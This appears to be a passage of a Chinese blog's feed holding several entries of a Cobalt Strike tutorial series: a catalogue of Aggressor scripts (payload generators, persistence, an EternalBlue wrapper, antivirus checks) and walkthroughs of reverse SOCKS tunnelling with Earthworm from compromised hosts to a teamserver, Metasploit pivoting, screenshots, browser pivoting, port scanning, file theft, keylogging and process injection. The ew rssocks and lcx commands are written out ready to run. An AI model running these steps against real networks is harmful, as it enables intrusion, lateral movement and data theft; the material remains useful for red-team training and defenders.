href="https://imgchr.com/i/e18GW9"><img src="https://s2.ax1x.com/2019/07/28/e18GW9.png" alt="e18GW9.png"></a></p><h3 id="脚本名称：ArtifactPayloadGenerator-cna"><a href="#脚本名称：ArtifactPayloadGenerator-cna" class="headerlink" title="脚本名称：ArtifactPayloadGenerator.cna"></a>脚本名称：ArtifactPayloadGenerator.cna</h3><p>脚本功能：创建多种类型的payload。生成的文件在cs目录下的opt\cobaltstrike<br><a href="https://imgchr.com/i/e18UL6"><img src="https://s2.ax1x.com/2019/07/28/e18UL6.png" alt="e18UL6.png"></a></p><h3 id="脚本名称：AVQuery-cna"><a href="#脚本名称：AVQuery-cna" class="headerlink" title="脚本名称：AVQuery.cna"></a>脚本名称：AVQuery.cna</h3><p>脚本功能：查询目标所安装的所有杀软</p><h3 id="脚本名称：CertUtilWebDelivery-cna"><a href="#脚本名称：CertUtilWebDelivery-cna" class="headerlink" title="脚本名称：CertUtilWebDelivery.cna"></a>脚本名称：CertUtilWebDelivery.cna</h3><p>脚本功能：利用CertUtil和rundll32生成会话这个应该都知道了解</p><h3 id="脚本名称：RedTeamRepo-cna"><a href="#脚本名称：RedTeamRepo-cna" class="headerlink" title="脚本名称：RedTeamRepo.cna"></a>脚本名称：RedTeamRepo.cna</h3><p>脚本功能：就是提示一下常用的渗透命令<br><a href="https://imgchr.com/i/e180oD"><img src="https://s2.ax1x.com/2019/07/28/e180oD.png" alt="e180oD.png"></a></p><h3 id="脚本名称：ProcessColor-cna"><a href="#脚本名称：ProcessColor-cna" class="headerlink" title="脚本名称：ProcessColor.cna"></a>脚本名称：ProcessColor.cna</h3><p>脚本功能：显示带有颜色的进程列表(不同颜色有不同含义)<br>[<img src="https://s2.ax1x.com/2019/07/28/e18byq.png" alt="e18byq.png">]</p><h3 id="脚本名称：EDR-cna"><a href="#脚本名称：EDR-cna" class="headerlink" title="脚本名称：EDR.cna"></a>脚本名称：EDR.cna</h3><p>脚本功能：检查有无终端安全产品</p><h3 id="脚本名称：logvis-cna"><a href="#脚本名称：logvis-cna" class="headerlink" title="脚本名称：logvis.cna"></a>脚本名称：logvis.cna</h3><p>脚本功能：显示Beacon命令日志<br><img src="https://s2.ax1x.com/2019/07/28/e1Gfj1.png" alt="e1Gfj1.png"></p><h3 id="脚本名称：ProcessMonitor-cna"><a href="#脚本名称：ProcessMonitor-cna" class="headerlink" title="脚本名称：ProcessMonitor.cna"></a>脚本名称：ProcessMonitor.cna</h3><p>脚本功能：记录一段时间内程序启动的情况</p><h3 id="脚本名称：SMBPayloadGenerator-cna"><a href="#脚本名称：SMBPayloadGenerator-cna" class="headerlink" title="脚本名称：SMBPayloadGenerator.cna"></a>脚本名称：SMBPayloadGenerator.cna</h3><p>脚本功能：生成基于SMB的payload</p><h3 id="脚本名称：Persistence-x2F-Persistence-Menu-cna"><a href="#脚本名称：Persistence-x2F-Persistence-Menu-cna" class="headerlink" title="脚本名称：Persistence&#x2F;Persistence_Menu.cna"></a>脚本名称：Persistence&#x2F;Persistence_Menu.cna</h3><p>脚本功能：持久化控制集合<br>备注:这个脚本是同目录脚本的一个集合<br><a href="https://imgchr.com/i/e18xkF"><img src="https://s2.ax1x.com/2019/07/28/e18xkF.png" alt="e18xkF.png"></a></p><h3 id="脚本名称：Eternalblue-cna-脚本功能：ms17-010"><a href="#脚本名称：Eternalblue-cna-脚本功能：ms17-010" class="headerlink" title="脚本名称：Eternalblue.cna 脚本功能：ms17-010"></a>脚本名称：Eternalblue.cna 脚本功能：ms17-010</h3><p><a href="https://gist.github.com/rsmudge/9b54a66744a94f3950cc171254057942">https://gist.github.com/rsmudge/9b54a66744a94f3950cc171254057942</a><br>备注：调用exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</p><p>更多:<a href="https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg">https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg</a><br>个人认位这位老哥整理的已经很全面了，为了方便查看我将里面的一些集合脚本介绍图片列了出来。</p><p><a href="https://github.com/harleyQu1nn/AggressorScripts">https://github.com/harleyQu1nn/AggressorScripts</a><br><a href="https://imgchr.com/i/e186SA"><img src="https://s2.ax1x.com/2019/07/28/e186SA.png" alt="e186SA.png"></a></p><p><a href="https://github.com/bluscreenofjeff/AggressorScripts">https://github.com/bluscreenofjeff/AggressorScripts</a><br><a href="https://imgchr.com/i/e18gyt"><img src="https://s2.ax1x.com/2019/07/28/e18gyt.png" alt="e18gyt.png"></a></p><p><a href="https://github.com/michalkoczwara/aggressor_scripts_collection">https://github.com/michalkoczwara/aggressor_scripts_collection</a><br><a href="https://imgchr.com/i/e18Wef"><img src="https://s2.ax1x.com/2019/07/28/e18Wef.png" alt="e18Wef.png"></a><br><a href="https://github.com/vysec/Aggressor-VYSEC">https://github.com/vysec/Aggressor-VYSEC</a><br><a href="https://imgchr.com/i/e18hTS"><img src="https://s2.ax1x.com/2019/07/28/e18hTS.png" alt="e18hTS.png"></a></p><p><a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit">https://github.com/killswitch-GUI/CobaltStrike-ToolKit</a><br><a href="https://imgchr.com/i/e185Fg"><img src="https://s2.ax1x.com/2019/07/28/e185Fg.png" alt="e185Fg.png"></a><br><a href="https://github.com/ramen0x3f/AggressorScripts">https://github.com/ramen0x3f/AggressorScripts</a></p><p><a href="https://imgchr.com/i/e18oWj"><img src="https://s2.ax1x.com/2019/07/28/e18oWj.png" alt="e18oWj.png"></a></p><p><a href="https://github.com/rasta-mouse/Aggressor-Script">https://github.com/rasta-mouse/Aggressor-Script</a><br><a href="https://imgchr.com/i/e18Hln"><img src="https://s2.ax1x.com/2019/07/28/e18Hln.png" alt="e18Hln.png"></a><br><a href="https://github.com/Und3rf10w/Aggressor-scripts">https://github.com/Und3rf10w/Aggressor-scripts</a><br><a href="https://imgchr.com/i/e18qO0"><img src="https://s2.ax1x.com/2019/07/28/e18qO0.png" alt="e18qO0.png"></a><br><a href="https://github.com/001SPARTaN/aggressor_scripts">https://github.com/001SPARTaN/aggressor_scripts</a><br><a href="https://imgchr.com/i/e18OmV"><img src="https://s2.ax1x.com/2019/07/28/e18OmV.png" alt="e18OmV.png"></a></p><p><a href="https://github.com/gaudard/scripts/tree/master/red-team/aggressor">https://github.com/gaudard/scripts/tree/master/red-team/aggressor</a><br><a href="https://imgchr.com/i/e1GSfJ"><img src="https://s2.ax1x.com/2019/07/28/e1GSfJ.png" alt="e1GSfJ.png"></a><br><a href="https://github.com/branthale/CobaltStrikeCNA">https://github.com/branthale/CobaltStrikeCNA</a><br><a href="https://imgchr.com/i/e18XwT"><img src="https://s2.ax1x.com/2019/07/28/e18XwT.png" alt="e18XwT.png"></a><br><a href="https://github.com/threatexpress/aggressor-scripts">https://github.com/threatexpress/aggressor-scripts</a> <a href="https://github.com/threatexpress/red-team-scripts">https://github.com/threatexpress/red-team-scripts</a> <a href="https://github.com/threatexpress/persistence-aggressor-script">https://github.com/threatexpress/persistence-aggressor-script</a><br><a href="https://imgchr.com/i/e18jTU"><img src="https://s2.ax1x.com/2019/07/28/e18jTU.png" alt="e18jTU.png"></a></p><p><a href="https://github.com/FortyNorthSecurity/AggressorAssessor">https://github.com/FortyNorthSecurity/AggressorAssessor</a><br><a href="https://imgchr.com/i/e18zY4"><img src="https://s2.ax1x.com/2019/07/28/e18zY4.png" alt="e18zY4.png"></a></p><p>脚本来源:</p><p><a href="https://github.com/rsmudge/ElevateKit">https://github.com/rsmudge/ElevateKit</a><br><a href="https://github.com/vysec/CVE-2018-4878">https://github.com/vysec/CVE-2018-4878</a> <a href="https://github.com/harleyQu1nn/AggressorScripts">https://github.com/harleyQu1nn/AggressorScripts</a> <a href="https://github.com/bluscreenofjeff/AggressorScripts">https://github.com/bluscreenofjeff/AggressorScripts</a> <a href="https://github.com/ramen0x3f/AggressorScripts">https://github.com/ramen0x3f/AggressorScripts</a><br><a href="https://github.com/360-A-Team/CobaltStrike-Toolset">https://github.com/360-A-Team/CobaltStrike-Toolset</a> <a href="https://github.com/ars3n11/Aggressor-Scripts">https://github.com/ars3n11/Aggressor-Scripts</a> <a href="https://github.com/michalkoczwara/aggressor_scripts_collection">https://github.com/michalkoczwara/aggressor_scripts_collection</a> <a href="https://github.com/vysec/Aggressor-VYSEC">https://github.com/vysec/Aggressor-VYSEC</a><br><a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit">https://github.com/killswitch-GUI/CobaltStrike-ToolKit</a> <a href="https://github.com/ZonkSec/persistence-aggressor-script">https://github.com/ZonkSec/persistence-aggressor-script</a> <a href="https://github.com/ramen0x3f/AggressorScripts">https://github.com/ramen0x3f/AggressorScripts</a><br><a href="https://github.com/rasta-mouse/Aggressor-Script">https://github.com/rasta-mouse/Aggressor-Script</a> <a href="https://github.com/RhinoSecurityLabs/Aggressor-Scripts">https://github.com/RhinoSecurityLabs/Aggressor-Scripts</a> <a href="https://github.com/Und3rf10w/Aggressor-scripts">https://github.com/Und3rf10w/Aggressor-scripts</a><br><a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a><br><a href="https://github.com/Genetic-Malware/Ebowla">https://github.com/Genetic-Malware/Ebowla</a> <a href="https://github.com/001SPARTaN/aggressor_scripts">https://github.com/001SPARTaN/aggressor_scripts</a> <a href="https://github.com/gaudard/scripts/tree/master/red-team/aggressor">https://github.com/gaudard/scripts/tree/master/red-team/aggressor</a> <a href="https://github.com/branthale/CobaltStrikeCNA">https://github.com/branthale/CobaltStrikeCNA</a> <a href="https://github.com/oldb00t/AggressorScripts">https://github.com/oldb00t/AggressorScripts</a> <a href="https://github.com/p292/Phant0m_cobaltstrike">https://github.com/p292/Phant0m_cobaltstrike</a> <a href="https://github.com/p292/DDEAutoCS">https://github.com/p292/DDEAutoCS</a> <a href="https://github.com/secgroundzero/CS-Aggressor-Scripts">https://github.com/secgroundzero/CS-Aggressor-Scripts</a> <a href="https://github.com/skyleronken/Aggressor-Scripts">https://github.com/skyleronken/Aggressor-Scripts</a> <a href="https://github.com/tevora-threat/aggressor-powerview">https://github.com/tevora-threat/aggressor-powerview</a> <a href="https://github.com/tevora-threat/PowerView3-Aggressor">https://github.com/tevora-threat/PowerView3-Aggressor</a> <a href="https://github.com/threatexpress/aggressor-scripts">https://github.com/threatexpress/aggressor-scripts</a> <a href="https://github.com/threatexpress/red-team-scripts">https://github.com/threatexpress/red-team-scripts</a><br><a href="https://github.com/threatexpress/persistence-aggressor-script">https://github.com/threatexpress/persistence-aggressor-script</a> <a href="https://github.com/FortyNorthSecurity/AggressorAssessor">https://github.com/FortyNorthSecurity/AggressorAssessor</a> <a href="https://github.com/mdsecactivebreach/CACTUSTORCH">https://github.com/mdsecactivebreach/CACTUSTORCH</a> <a href="https://github.com/C0axx/AggressorScripts">https://github.com/C0axx/AggressorScripts</a> <a href="https://github.com/offsecginger/AggressorScripts">https://github.com/offsecginger/AggressorScripts</a> <a href="https://github.com/tomsteele/cs-magik">https://github.com/tomsteele/cs-magik</a> <a href="https://github.com/bitsadmin/nopowershell">https://github.com/bitsadmin/nopowershell</a> <a href="https://github.com/SpiderLabs/SharpCompile">https://github.com/SpiderLabs/SharpCompile</a> <a href="https://github.com/SpiderLabs/SharpCompile">https://github.com/SpiderLabs/SharpCompile</a> <a href="https://github.com/realoriginal/reflectivepotato">https://github.com/realoriginal/reflectivepotato</a></p><p>还有很多很多我就不列出来了太麻烦了。</p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(九)内置Socks与神器EW</title>
      <link href="/2019/06/16/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B9%9D-%E5%86%85%E7%BD%AESocks%E4%B8%8E%E7%A5%9E%E5%99%A8EW/"/>
      <url>/2019/06/16/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B9%9D-%E5%86%85%E7%BD%AESocks%E4%B8%8E%E7%A5%9E%E5%99%A8EW/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Socks概念"><a href="#0x01-Socks概念" class="headerlink" title="0x01-Socks概念"></a>0x01-Socks概念</h2><p>目前利用网络防火墙将组织内部的网络结构与外部网络如 INTERNET 中有效地隔离开来，这种方法正变得逐渐流行起来。这些防火墙系统通常以应用层网关的形式工作在网络之间，提供受控的 TELNET 、 FTP 、 SMTP 等的接入。 SOCKS 提供一个通用框架来使这些协议安全透明地穿过防火墙。<br>说的简单明了一点，在渗透测试中，我们使用socks技术，可以穿透进入目标机的内网，从而扩大我们的战果<br><img src="/"></p><h2 id="0x002-Cobaltstrike自带Socks功能"><a href="#0x002-Cobaltstrike自带Socks功能" class="headerlink" title="0x002-Cobaltstrike自带Socks功能"></a>0x002-Cobaltstrike自带Socks功能</h2><p>选择一个beacon，右键，中转–&gt;SOCKS Server，或使用命令socks [port]<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542627.png" alt="image"></p><p>弹出一个窗口，按要求配置好代理端口<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542560.png" alt="image"></p><p>如图，成功开启socks 4，连接我们teamserver的5126端口，即可进入目标机内网~<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542192.png" alt="image"></p><h2 id="0x03-使用ew-SocksCap穿透到目标机内网"><a href="#0x03-使用ew-SocksCap穿透到目标机内网" class="headerlink" title="0x03-使用ew+SocksCap穿透到目标机内网"></a>0x03-使用ew+SocksCap穿透到目标机内网</h2><h3 id="①Earthworm-下载见文末"><a href="#①Earthworm-下载见文末" class="headerlink" title="①Earthworm(下载见文末)"></a>①Earthworm(下载见文末)</h3><p>Ew(Earthworm)是一款当之无愧的内网穿透大杀器，应用的平台非常广泛，包括</p><pre><code>ew_for_Win.exe        适用各种Windows系统(X86指令集、X64指令集)        Windows7、Windows XPew_for_Linux32        各常见Linux发行版 (X86 指令集 CPU)        Ubuntu(X86)/BT5(X86)ew_for_linux64        各常见Linux发行版 (X64 指令集 CPU)        Ubuntu(X64)/Kali(X64)ew_for_MacOSX64        MacOS系统发行版 (X64 指令集)        苹果PC电脑，苹果serverew_for_Arm32        常见Arm-Linux系统        HTC New One(Arm-Android)/小米路由器(R1D)ew_mipsel        常见Mips-Linux系统 (Mipsel指令集 CPU)        萤石硬盘录像机、小米mini路由器(R1CM)</code></pre><p>下面简单讲一下它的应用场景和命令<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542432.png" alt="image"></p><h3 id="正向socks-v5服务器-【适用于目标机拥有一个外网IP】"><a href="#正向socks-v5服务器-【适用于目标机拥有一个外网IP】" class="headerlink" title="正向socks v5服务器        【适用于目标机拥有一个外网IP】"></a>正向socks v5服务器        【适用于目标机拥有一个外网IP】</h3><p>服务器端执行以下命令<br>ew.exe -s ssocksd -l 888</p><p>说明：服务器开启端口为888，SOCKS的代理。然后使用sockscap64添加这个IP的代理就可以使用了。</p><h3 id="反弹socks-v5服务器-【适用于目标机器没有公网IP，但可访问内网资源】"><a href="#反弹socks-v5服务器-【适用于目标机器没有公网IP，但可访问内网资源】" class="headerlink" title="反弹socks v5服务器        【适用于目标机器没有公网IP，但可访问内网资源】"></a>反弹socks v5服务器        【适用于目标机器没有公网IP，但可访问内网资源】</h3><p>本地执行以下命令<br>ew.exe -s rcsocks -l 1008 -e 888</p><p>说明：该命令的意思是在我们公网VPS上添加一个转接隧道，把1080端口收到的代理请求转交给888端口。</p><p>服务器端执行以下命令<br>ew.exe -s rssocks -d 2.2.2.2 -e 888</p><p>说明：该命令的意思是在服务器上启动SOCKS V5服务，并反弹到IP地址为2.2.2.2的服务器888端口上。</p><h3 id="二级网络环境（一）"><a href="#二级网络环境（一）" class="headerlink" title="二级网络环境（一）"></a>二级网络环境（一）</h3><p>假设我们获得了右侧A主机和B主机的控制权<br>A主机配有2块网卡，一块连通外网，一块10.48.128.25只能连接内网B主机，无法访问内网其它资源。<br>B主机可以访问内网资源，但无法访问外网。</p><p>A.先上传ew到B主机，利用ssocksd方式启动888端口的SOCKS代理，命令如下：<br>ew -s ssocksd -l 888</p><p>B.上传ew到右侧A主机，运行下列命令：<br>ew -s lcx_tran -l 1080 -f 10.48.128.49 -g 888</p><p>说明：该命令意思是将1080端口收到的代理请求转交给B主机（10.48.128.49）的888端口。</p><p>C.可以通过访问A主机外网139.XXX.XX.113:1080来使用在B主机架设的socks5代理。</p><h3 id="二级网络环境（二）"><a href="#二级网络环境（二）" class="headerlink" title="二级网络环境（二）"></a>二级网络环境（二）</h3><p>假设我们获得了右侧A主机和B主机的控制权限。<br>A主机没有公网IP，也无法访问内网资源。B主机可以访问内网资源，但无法访问外网。</p><p>这个操作分为4步，用到lcx_listen和lcx_slave命令：</p><p>A. 先上传ew 到左侧公网VPS上，运行下列命令：<br>ew –s lcx_listen –l 10800 –e 888<br>说明：该命令意思是在公网VPS添加转接隧道，将10800端口收到的代理请求转交给888端口。</p><p>B.上传ew到B主机，并利用ssocksd方式启动999端口的socks代理，命令如下：<br>ew -s ssocksd -l 999</p><p>C.上传ew 到A主机，运行下列命令：<br>ew -s lcx_slave -d 139.XXX.XX.113 -e 888 -f 10.48.128.49 -g 999<br>说明：该命令意思是在A主机上利用lcx_slave方式，将公网VPS的888端口和B主机的999端口连接起来。</p><p>D. 返回我们公网VPS的CMD界面下，可以看到已经连接成功了。<br>现在就可以通过访问公网VPS地址 139.XXX.XX.113:10800来使用在B主机架设的socks5代理。</p><h3 id="三级网络环境"><a href="#三级网络环境" class="headerlink" title="三级网络环境"></a>三级网络环境</h3><p>三级网络环境在实际渗透中用的比较少，也比较复杂，现在我们来一个个的讲解下三级级联的用法。</p><p>假设渗透场景：<br>内网A主机没有公网IP但可以访问外网<br>B主机不能访问外网但可以被A主机访问、C主机可被B主机访问而且能够访问核心区域。</p><p>A.在左侧公网VPS上运行命令，将1080端口收到的代理请求转交给888端口：<br>ew -s rcsocks -l 1080 -e 888</p><p>B.在A主机上运行命令，将公网VPS的888端口和B主机的999端口连接起来：<br>ew -s lcx_slave -d 139.XXX.XX.113 -e 888 -f 10.48.128.12 -g 999</p><p>C.在B主机上运行命令，将999端口收到的代理请求转交给777端口：<br>ew -s lcx_listen -l 999 -e 777</p><p>D.在C主机上启动SOCKS V5服务，并反弹到B主机的777端口上，命令如下。<br>ew -s rssocks -d 10.48.128.12 -e 777</p><p>E.在MY PC上可以通过访问公网VPS 139.XXX.XX.113:1080来使用在C主机架设的socks5代理。</p><p>整个数据流向是：SOCKS V5 → 1080 → 888 →999 →777 → rssocks</p><h2 id="实战场景"><a href="#实战场景" class="headerlink" title="实战场景"></a>实战场景</h2><p>本次测试目标机器没有公网IP，但可访问内网资源<br>1.我们在teamserver上运行以下命令<br>ew.exe -s rcsocks -l 1008 -e 888<br>接受888端口数据，然后转发到1008端口<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542245.png" alt="image"></p><p>2.然后我们在目标机上传ew，然后在cs中执行<br>ew.exe -s rssocks -d 2.2.2.2 -e 888（2.2.2.2为teamserver）<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542860.png" alt="image"></p><p>3.随后，我们的teamserver就会显示连接成功<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542807.png" alt="image"></p><h3 id="②使用SocksCap连接socks"><a href="#②使用SocksCap连接socks" class="headerlink" title="②使用SocksCap连接socks"></a>②使用SocksCap连接socks</h3><p>根据自己的Windows版本以管理员模式运行SocksCap后<br>点击代理，然后添加自己teamserver的ip和刚刚转发出来的端口<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542246.png" alt="image"></p><p>在这里把代理切换成刚刚添加的<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191542779.png" alt="image"></p><p>右键，添加一个exe文件，根据你的需求，添加要在socks隧道中运行的程序</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191543208.png" alt="image"></p><p>选择程序，右键–&gt;在代理隧道中运行选中程序，该程序即可通过socks进入目标内网</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191543868.png" alt="image"></p><p>如图，为连入socks通道的cmd ping目标机的某内网ip<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191543675.png" alt="image"></p><h2 id="0x004-在Kali中Metasploit使用socks通道"><a href="#0x004-在Kali中Metasploit使用socks通道" class="headerlink" title="0x004-在Kali中Metasploit使用socks通道"></a>0x004-在Kali中Metasploit使用socks通道</h2><p>1.使用cs搭建好socks4通道后，首先配置神器proxychains<br>在&#x2F;etc&#x2F;proxychains.conf配置文件中添加新的代理服务器。通过激活动态链设置，确保在不同的代理服务器之间能够正常切换。</p><pre><code>root@kali:~# cat /etc/proxychains.conf | grep -v &quot;#&quot;dynamic_chainproxy_dnstcp_read_time_out 15000tcp_connect_time_out 8000socks4  172.16.0.20 1080  # socks4通道的IP及端口</code></pre><p>然后在MSF中，配置socks4隧道即可让MSF进入目标机内网大杀四方<br>(2.2.2.2为teamserver的ip，1081为socks端口)</p><pre><code>msf exploit(ms08_067_netapi) &gt; use auxiliary/server/socks4amsf auxiliary(socks4a) &gt; set SRVHOST 2.2.2.2msf auxiliary(socks4a) &gt; set SRVPORT 1081SRVPORT =&gt; 1081msf auxiliary(socks4a) &gt; runAuxiliary module execution completedStarting the socks4a proxy servermsf auxiliary(socks4a) &gt;</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191543028.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(八)截图与浏览器代理</title>
      <link href="/2019/06/15/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%85%AB-%E6%88%AA%E5%9B%BE%E4%B8%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%A3%E7%90%86/"/>
      <url>/2019/06/15/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%85%AB-%E6%88%AA%E5%9B%BE%E4%B8%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-截图"><a href="#0x01-截图" class="headerlink" title="0x01-截图"></a>0x01-截图</h2><p>选择一个beacon，右键，目标–&gt;屏幕截图<br><a href="https://imgchr.com/i/elz5wD"><img src="https://s2.ax1x.com/2019/07/28/elz5wD.png" alt="elz5wD.png"></a><br>然后点击菜单栏上的“屏幕截图”按钮，如图，成功查看到截图<br><a href="https://imgchr.com/i/elz7Yd"><img src="https://s2.ax1x.com/2019/07/28/elz7Yd.png" alt="elz7Yd.png"></a></p><h2 id="0x02-浏览器代理"><a href="#0x02-浏览器代理" class="headerlink" title="0x02-浏览器代理"></a>0x02-浏览器代理</h2><p>选择一个beacon，右键，目标–&gt;浏览器代理<br><a href="https://imgchr.com/i/elzITe"><img src="https://s2.ax1x.com/2019/07/28/elzITe.png" alt="elzITe.png"></a><br>配置好相关的端口信息后，点击开始，即可使用目标机的指定端口作为浏览器代理<br><a href="https://imgchr.com/i/elzTFH"><img src="https://s2.ax1x.com/2019/07/28/elzTFH.png" alt="elzTFH.png"></a><br>随后cobaltstrike就会注入浏览器代理dll到进程中，我们通过配置我们服务器的IP,端口（本例中为123.207.x&#x2F;x），即可使用目标机作为浏览器代理<br><a href="https://imgchr.com/i/elz4eO"><img src="https://s2.ax1x.com/2019/07/28/elz4eO.png" alt="elz4eO.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(七)端口扫描与Net View</title>
      <link href="/2019/06/15/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%83-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E4%B8%8ENet-View/"/>
      <url>/2019/06/15/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%B8%83-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E4%B8%8ENet-View/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01-端口扫描"></a>0x01-端口扫描</h2><p><a href="https://imgchr.com/i/elXh5R"><img src="https://s2.ax1x.com/2019/07/28/elXh5R.png" alt="elXh5R.png"></a></p><p>右键一个beacon，选择目标–&gt;端口扫描</p><p>或在beacon中使用命令portscan [ip] 命令</p><p>随后Cobaltstrike会自动识别目标机所在的内网ip段，可选择ARP，ICMP，none三种方式进行扫描，ports中填入你要扫描的端口</p><p><a href="https://imgchr.com/i/elXWVJ"><img src="https://s2.ax1x.com/2019/07/28/elXWVJ.png" alt="elXWVJ.png"></a><br>扫描后的结果，会在beacon中输出，或可在目标视图中查看到<br><a href="https://imgchr.com/i/elXo26"><img src="https://s2.ax1x.com/2019/07/28/elXo26.png" alt="elXo26.png"></a></p><h2 id="0x02-Net-view"><a href="#0x02-Net-view" class="headerlink" title="0x02-Net view"></a>0x02-Net view</h2><p>选择一个beacon，右键，目标–&gt;Net View,或在beacon中使用命令net view</p><p><a href="https://imgchr.com/i/elXI8x"><img src="https://s2.ax1x.com/2019/07/28/elXI8x.png" alt="elXI8x.png"></a></p><p>如图，beacon中输出了net view的信息</p><p><a href="https://imgchr.com/i/elXfa9"><img src="https://s2.ax1x.com/2019/07/28/elXfa9.png" alt="elXfa9.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrike系列教程(六)文件/进程管理与键盘记录</title>
      <link href="/2019/06/12/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%85%AD-%E6%96%87%E4%BB%B6-%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E4%B8%8E%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/06/12/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%85%AD-%E6%96%87%E4%BB%B6-%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E4%B8%8E%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-文件管理"><a href="#0x01-文件管理" class="headerlink" title="0x01-文件管理"></a>0x01-文件管理</h2><h3 id="①基础管理"><a href="#①基础管理" class="headerlink" title="①基础管理"></a>①基础管理</h3><p>选择一个会话，右键，目标–&gt;文件管理<br><a href="https://imgchr.com/i/eM8fu8"><img src="https://s2.ax1x.com/2019/07/27/eM8fu8.png" alt="eM8fu8.png"></a><br>Upload为上传一个文件 ，Make Directory为创建文件夹，List Drives为列出盘符，refresh为刷新，这块很简单，就不一一讲了。<br><a href="https://imgchr.com/i/eM8Rjf"><img src="https://s2.ax1x.com/2019/07/27/eM8Rjf.png" alt="eM8Rjf.png"></a></p><h3 id="②下载文件"><a href="#②下载文件" class="headerlink" title="②下载文件"></a>②下载文件</h3><p>需要使用文件管理功能，然后右键download<br><a href="https://imgchr.com/i/eM8c9I"><img src="https://s2.ax1x.com/2019/07/27/eM8c9I.png" alt="eM8c9I.png"></a><br>再点击菜单栏上方的文件下载按钮<br><a href="https://imgchr.com/i/eM8y4A"><img src="https://s2.ax1x.com/2019/07/27/eM8y4A.png" alt="eM8y4A.png"></a><br>点击sync files，配置保存路径即可下载文件</p><h3 id="③执行或删除文件"><a href="#③执行或删除文件" class="headerlink" title="③执行或删除文件"></a>③执行或删除文件</h3><p><a href="https://imgchr.com/i/eM82gP"><img src="https://s2.ax1x.com/2019/07/27/eM82gP.png" alt="eM82gP.png"></a><br>执行文件点击execute后会弹出一个窗口，要求你输入要执行程序的参数，这边按你的要求填写就行，不需要参数的话就不填。<br><a href="https://imgchr.com/i/eM8g3t"><img src="https://s2.ax1x.com/2019/07/27/eM8g3t.png" alt="eM8g3t.png"></a></p><h2 id="0x02-进程管理"><a href="#0x02-进程管理" class="headerlink" title="0x02-进程管理"></a>0x02-进程管理</h2><h3 id="①进入进程管理"><a href="#①进入进程管理" class="headerlink" title="①进入进程管理"></a>①进入进程管理</h3><p>选择一个beacon，右键，目标–&gt;进程列表<br><a href="https://imgchr.com/i/eM8HCn"><img src="https://s2.ax1x.com/2019/07/27/eM8HCn.png" alt="eM8HCn.png"></a><br>进程列表中 ，kill为关闭程序，refresh为刷新进程列表，inject则是把beacon注入进程，Log Keystrokes为键盘记录，Stea Token为窃取运行指定程序的用户令牌<br><a href="https://imgchr.com/i/eM8hDS"><img src="https://s2.ax1x.com/2019/07/27/eM8hDS.png" alt="eM8hDS.png"></a><br>简单的功能就不讲了，这边讲一下进程注入(inject)，键盘记录(Log Keystrokes)。</p><h3 id="②进程注入"><a href="#②进程注入" class="headerlink" 